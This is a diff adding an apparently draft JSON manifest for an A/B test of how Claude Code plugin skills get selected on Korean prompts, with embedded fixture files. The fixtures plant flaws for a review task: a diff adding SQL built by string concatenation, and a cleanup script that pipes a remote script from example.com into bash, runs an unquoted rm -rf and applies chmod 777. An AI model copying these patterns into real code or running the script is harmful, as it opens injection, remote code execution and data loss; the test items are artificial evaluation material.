@@ -1,0 +1,275 @@
+{
+  "frozenAt": "2026-09-28T08:22:54.041Z",
+  "purpose": "G2 independent paired natural-language selection/execution check for the v2.7.3 intake port; arms re-pointed from the frozen G2-input, everything else unchanged",
+  "status": "DRAFT_NOT_FROZEN_NOT_RUN",
+  "owner": "chief Claude cloud runner, dev2 independent review",
+  "sourceG": {
+    "root": "D:/codex/거버전스 3.0/ags-evidence/cloud-port272-nl-ab/20260928T073317Z/port272-nl-ab",
+    "manifestSha256": "62a9fe587b1768ce156b1a8849ad0f5b79fd6a5bc30e85cd09a13e2a42548086",
+    "earlierNaturalSkillRuns": {
+      "base": "11/27",
+      "candidate2b": "0/27"
+    },
+    "limitation": "old G denied plugin reference reads and node/npm testing; old G counts are not quality proof or a directly comparable execution score"
+  },
+  "arms": {
+    "base": {
+      "sha": "8763cef2b11f2635d6c9af7861b5bffd496e2a30",
+      "tree": "eed08f9675246c8519607f7b945dcd4055a14d92",
+      "ref": "main (v2.7.2)"
+    },
+    "candidate": {
+      "sha": "732ba286a68b35a7cbd99aefbea12d11b88f1b8c",
+      "tree": "06d58b258d467214db08943d30e13d3c3e4ef2fe",
+      "parent": "afafd4e63a76d45b21185e7c74e9b1b4f841e7ab",
+      "ref": "claude/v273-intake",
+      "ports": {
+        "2b53e325f549a9ebd32a143d1d11f7b4393355fa": "c548c77fc01ef752012dfb3dd8a3e22f0eb39263",
+        "cb59ad7f0f74a32a910e0afc2d196d12ea460c67": "afafd4e63a76d45b21185e7c74e9b1b4f841e7ab"
+      }
+    }
+  },
+  "design": {
+    "prompts": "same 9 natural + 2 explicit controls, bytes frozen below",
+    "repetitionsPerArm": 3,
+    "runs": 66,
+    "model": "claude-opus-5-5",
+    "claudeVersion": "2.1.283 (Claude Code)",
+    "node": "v24.21.0",
+    "pnpm": "11.19.0",
+    "maxTurns": 20,
+    "permissionMode": "acceptEdits",
+    "seed": 20260928,
+    "order": "same frozen order; only candidate ref changes",
+    "concurrency": 4
+  },
+  "permissions": {
+    "sameForBothArms": true,
+    "required": [
+      "Read/Glob/Grep active plugin SKILL.md, referenced files and fixture repository",
+      "Run existing node test/verification and npm test/pnpm test in each disposable fixture cwd",
+      "Run skill-owned local checkers and read-only Git checks required by the selected skill"
+    ],
+    "prohibited": [
+      "operational queue submit/cancel",
+      "real HOME or production trust/session/board/workflow/continuity state",
+      "remote push/tag/release",
+      "read competing arm policy as session input",
+      "bypass missing authority or gate"
+    ],
+    "preflight": "Record actual compiled CLI tool permissions; verify body/reference read and fixture test permissions in both arms before measured runs. A denial or unsupported host surface is NOT_RUN/insufficient evidence, not a skill failure or PASS.",
+    "isolation": "fresh session and cwd per run; disposable HOME, XDG, plugindata, shared/messaging/workflow/continuity/board/trust roots for BOTH arms, with broker+hook resolving the same fixture trust store"
+  },
+  "rubric": {
+    "primary": "raw Skill/native invocation -> body/reference load -> actual specialist work -> concrete output/verification; inspect raw ordering, denials and final artifacts",
+    "secondary": [
+      "names/call counts/turns are descriptive only",
+      "report unnecessary registry/plan/workflow/impact classification separately",
+      "report fixture source changes and regression test outcome",
+      "independent actor reviews frozen candidate and raw evidence"
+    ],
+    "cases": {
+      "p1": "actual ponytail use before memo implementation, fixture result checked",
+      "p2": "general read-only review; no ponytail or keyword-only governance attachment",
+      "p3": "rebase/merge conceptual explanation; no change-scope-guardian from merge keyword",
+      "p4": "run existing tests; if fixing, actual ponytail at repair stage; passing result tied to changed source",
+      "p5": "actual Korean prose specialist work/output and required reference/finalization path",
+      "p6": "greeting answered directly without unnecessary skills/registry/workflow",
+      "p7": "actual orchestrator use when multiple scope/preflight gates must connect; no remote exists, so state the unmet precondition and perform no publish effect",
+      "p8": "actual ponytail if code is changed; implementation/output evidence and no artificial compulsory workflow",
+      "p9": "safety review uses applicable audit scope; no ponytail for read-only review and no audit PASS inferred from successful artifact creation",
+      "x1": "explicit named Korean prose skill honored with actual work",
+      "x2": "explicit ponytail honored with actual implementation"
+    }
+  },
+  "prompts": [
+    {
+      "id": "p1",
+      "file": "scripts/prompts/p1.txt",
+      "sha256": "1cf53c16d1a6d4836fed551a6b6510822cb27fbf652a7bb85866dc43bae36395",
+      "bytes": 96,
+      "text": "fib.js의 fib 함수가 큰 n에서 너무 느려요. 메모이제이션을 추가해 주세요."
+    },
+    {
+      "id": "p2",
+      "file": "scripts/prompts/p2.txt",
+      "sha256": "26532015eabcd1a00ae118e26d6511a6b1c340778b8498bff8d33251d0fea23c",
+      "bytes": 104,
+      "text": "change.diff 파일에 있는 변경 사항을 리뷰해 주세요. 문제가 있으면 알려 주세요."
+    },
+    {
+      "id": "p3",
+      "file": "scripts/prompts/p3.txt",
+      "sha256": "4de685294e350b6fc151a4e6696c98af60cd3ac433da5e69a304be9eff2f6a35",
+      "bytes": 71,
+      "text": "git rebase랑 merge 차이가 뭐예요? 간단히 설명해 주세요."
+    },
+    {
+      "id": "p4",
+      "file": "scripts/prompts/p4.txt",
+      "sha256": "b6d172e1e30cefd3e482a1998c5afae71dfaa33e9c7d9c9b886d79c44b78d9e1",
+      "bytes": 88,
+      "text": "이 프로젝트 테스트를 돌려 보고 실패하는 게 있으면 고쳐 주세요."
+    },
+    {
+      "id": "p5",
+      "file": "scripts/prompts/p5.txt",
+      "sha256": "733e735f1aa1f1eef2b9a5ab3ccb4ba7c8800b2c82e2ab407a694af258cfeebb",
+      "bytes": 396,
+      "text": "다음 문단을 자연스러운 한국어로 다듬어 주세요.\n\n본 시스템은 사용자의 편의성 증대를 위한 목적으로 개발되어졌으며, 다양한 기능들을 제공하는 것을 통해 업무의 효율성을 향상시키는 것이 가능하게 되어진다. 또한 이러한 기능들은 사용자들에 의해서 쉽게 사용되어질 수 있도록 설계되어졌다."
+    },
+    {
+      "id": "p6",
+      "file": "scripts/prompts/p6.txt",
+      "sha256": "3bd01316d6c0b6d5a18344fdb77ed7fe12c5700b68ea1d79bd384b23310bd65f",
+      "bytes": 69,
+      "text": "안녕하세요! 오늘 날씨 정말 좋네요. 잘 지내셨어요?"
+    },
+    {
+      "id": "p7",
+      "file": "scripts/prompts/p7.txt",
+      "sha256": "b10f14383ebf60d325695872e0b73a4d339de7611e9ecf8375678867774cbcc9",
+      "bytes": 42,
+      "text": "main에 push하고 v9.9.9 태그 달아줘"
+    },
+    {
+      "id": "p8",
+      "file": "scripts/prompts/p8.txt",
+      "sha256": "6b18362637904bdeede9787bda7ab07765bb1adc5613ba3fb1961835c91afa2a",
+      "bytes": 30,
+      "text": "이거 좀 좋게 만들어줘"
+    },
+    {
+      "id": "p9",
+      "file": "scripts/prompts/p9.txt",
+      "sha256": "d3a30e204a4eae6fca0345879093e678d3d8b28c0ddd04afc3967400725dcdbb",
+      "bytes": 36,
+      "text": "이 스크립트 안전한지 봐줘"
+    },
+    {
+      "id": "x1",
+      "file": "scripts/prompts/x1.txt",
+      "sha256": "0aaf6f4cf0b9ed7dd2faea7bfe6fd768d70f30217135f48503f8ef38c4cf40ad",
+      "bytes": 397,
+      "text": "korean-prose-editor 스킬로 다음 문단을 다듬어 주세요.\n\n본 시스템은 사용자의 편의성 증대를 위한 목적으로 개발되어졌으며, 다양한 기능들을 제공하는 것을 통해 업무의 효율성을 향상시키는 것이 가능하게 되어진다. 또한 이러한 기능들은 사용자들에 의해서 쉽게 사용되어질 수 있도록 설계되어졌다."
+    },
+    {
+      "id": "x2",
+      "file": "scripts/prompts/x2.txt",
+      "sha256": "babf89c36d1c7d9e4552f7d7ba952365d69770412ff1bea8b601d22147545744",
+      "bytes": 89,
+      "text": "/agent-governance-suite:ponytail 로 fib.js에 메모이제이션을 추가해 주세요."
+    }
+  ],
+  "fixtures": [
+    {
+      "file": "scripts/fixtures/fib.js",
+      "sha256": "91a9c550c87d99e76d066b6b5fad7fb1baf752007afd1742532f82207e6dce05",
+      "bytes": 189,
+      "text": "function fib(n) {\n  if (n < 2) return n;\n  return fib(n - 1) + fib(n - 2);\n}\n\nmodule.exports = { fib };\n\nif (require.main === module) {\n  console.log(fib(Number(process.argv[2] || 30)));\n}\n"
+    },
+    {
+      "file": "scripts/fixtures/change.diff",
+      "sha256": "f898368e4784e270c27feb81a34dc3d9a3a5ff263c3198e671cf81e472a1a04a",
+      "bytes": 741,
+      "text": "diff --git a/src/user.js b/src/user.js\nindex 3b18e51..a9c2f04 100644\n--- a/src/user.js\n+++ b/src/user.js\n@@ -1,12 +1,18 @@\n const db = require(\"./db\");\n \n-async function getUser(id) {\n-  return db.query(\"SELECT * FROM users WHERE id = ?\", [id]);\n+async function getUser(id, fields) {\n+  const cols = fields ? fields.join(\",\") : \"*\";\n+  return db.query(\"SELECT \" + cols + \" FROM users WHERE id = \" + id);\n }\n \n-async function deleteUser(id) {\n-  await db.query(\"DELETE FROM users WHERE id = ?\", [id]);\n+async function deleteUsers(ids) {\n+  for (var i = 0; i <= ids.length; i++) {\n+    await db.query(\"DELETE FROM users WHERE id = ?\", [ids[i]]);\n+  }\n }\n \n-module.exports = { getUser, deleteUser };\n+module.exports = { getUser, deleteUsers };\n"
+    },
+    {
+      "file": "scripts/fixtures/util.js",
+      "sha256": "eb3e2117d5279acfeafd378570aba7a34ba162861b828c18eefb558ec95bc430",
+      "bytes": 298,
+      "text": "function proc(d){var r=[];for(var i=0;i<d.length;i++){if(d[i]!=null&&d[i]!=undefined){if(d[i].a==1){r.push(d[i].n.toUpperCase())}else{r.push(d[i].n)}}}return r}\nfunction f2(x){return x.split(',').map(function(y){return y.trim()}).filter(function(z){return z!=''})}\nmodule.exports={proc:proc,f2:f2}\n"
+    },
+    {
+      "file": "scripts/fixtures/cleanup.sh",
+      "sha256": "ae1cf2c5f23368044ea1aa06227b0523b9b0522313e87744f74dd678e29c931b",
+      "bytes": 258,
+      "text": "#!/bin/bash\n# 빌드 산출물과 오래된 로그 정리\nTARGET=$1\nLOG_DIR=/var/log/myapp\ncd $TARGET\nrm -rf $BUILD_DIR/*\nfind $LOG_DIR -name \"*.log\" -mtime +7 -exec rm {} \\;\ncurl -s http://example.com/post-cleanup.sh | bash\nchmod -R 777 $TARGET\necho \"done\"\n"
+    },
+    {
+      "file": "scripts/fixtures/proj/package.json",
+      "sha256": "9fd4c77e0b06cf1bd8d68dd94528696b656f29e49f479c0e612866634035e874",
+      "bytes": 113,
+      "text": "{\n  \"name\": \"tiny-proj\",\n  \"version\": \"1.0.0\",\n  \"private\": true,\n  \"scripts\": { \"test\": \"node --test test/\" }\n}\n"
+    },
+    {
+      "file": "scripts/fixtures/proj/math.js",
+      "sha256": "35f98f83251f3aa4f4434062b54c189f05280f34cbec68001c9e0adf648cfa14",
+      "bytes": 261,
+      "text": "function sum(values) {\n  let total = 0;\n  for (let i = 1; i < values.length; i++) total += values[i];\n  return total;\n}\n\nfunction average(values) {\n  if (values.length === 0) return 0;\n  return sum(values) / values.length;\n}\n\nmodule.exports = { sum, average };\n"
+    },
+    {
+      "file": "scripts/fixtures/proj/test/math.test.js",
+      "sha256": "52cbbe915c64f7d00b93bee03bc84d3f8d79e7d02e861199e10df96776046153",
+      "bytes": 371,
+      "text": "const test = require(\"node:test\");\nconst assert = require(\"node:assert\");\nconst { sum, average } = require(\"../math\");\n\ntest(\"sum adds all values\", () => {\n  assert.strictEqual(sum([1, 2, 3]), 6);\n});\n\ntest(\"average of empty list is 0\", () => {\n  assert.strictEqual(average([]), 0);\n});\n\ntest(\"average of values\", () => {\n  assert.strictEqual(average([2, 4, 6]), 4);\n});\n"
+    }
+  ],
+  "harness": [
+    {
+      "file": "scripts/nl-ab.sh",
+      "sha256": "32e7487a20e89fd0f71e5666b800ae980d95c5888391a6bf9b97f88f6eee25c1",
+      "bytes": 2183
+    },
+    {
+      "file": "scripts/prepare-cwd.sh",
+      "sha256": "f838d6cc6489d8428aef462dd329d3e0a631500ec741b9fefd96bdfee73642d2",
+      "bytes": 660
+    },
+    {
+      "file": "scripts/make-order.mjs",
+      "sha256": "8bb938de1f8ea7b8b29dd4f4f57c7d5d252eb82a6e7130c1556487ef6863ade6",
+      "bytes": 745
+    },
+    {
+      "file": "scripts/order.txt",
+      "sha256": "a92c07af9890dcbb2dbf95d40119b4d36d2b06714aa29877f623222750dda1e2",
+      "bytes": 1452
+    },
+    {
+      "file": "scripts/order-seed.txt",
+      "sha256": "b7cb574b2853ba68a9640cd50b0dd99fe21ebee6fdcf8973a7b1fd15b1d88e91",
+      "bytes": 14
+    },
+    {
+      "file": "scripts/analyze.mjs",
+      "sha256": "264a2288b122b25b9f92f6d1f83b8edd1cd8ba898a8446ee36fcdd98364fafb3",
+      "bytes": 5806
+    },
+    {
+      "file": "scripts/summarize.mjs",
+      "sha256": "ce3775d5e57777623ebe6a0072bf5531f4d74a2fad61f500b24301c398bbb63e",
+      "bytes": 3909
+    },
+    {
+      "file": "scripts/run-one.sh",
+      "sha256": "49a45d56d1c18ea300881d6771e03c005d9caa675d78f03eb05612378213867a",
+      "bytes": 1149
+    }
+  ],
+  "pending": [
+    "chief executes independent Claude cloud only",
+    "dev2 fixed-candidate review",
+    "natural selection/execution recovery verdict"
+  ],
+  "cloudPolicy": "Codex cloud works remains user-paused; no cloud run launched by this artifact",
+  "derivedFrom": {
+    "branch": "claude/v273-inputs",
+    "commit": "93cb791bcca05501fd1848936eadd9800a9ca206",
+    "file": "G2-input.json",
+    "sha256": "a3ddc6e61e2391eee016204df3c04cf997b5c7713831e015f18523841e56c2df",
+    "changedKeys": [
+      "status",
+      "purpose",
+      "arms",
+      "derivedFrom",
+      "fixtureSource"
+    ]
+  },
+  "fixtureSource": {
+    "branch": "claude/evidence-port272-nl-ab-20260928T073317Z",
+    "commit": "7b7f49acb4e93bdd06ee77f7792140e839c4a9a9",
+    "prefix": "port272-nl-ab/",
+    "verified": "all 11 prompts, 7 fixtures and 8 harness files match the frozen sha256 and byte counts"
+  }
+}
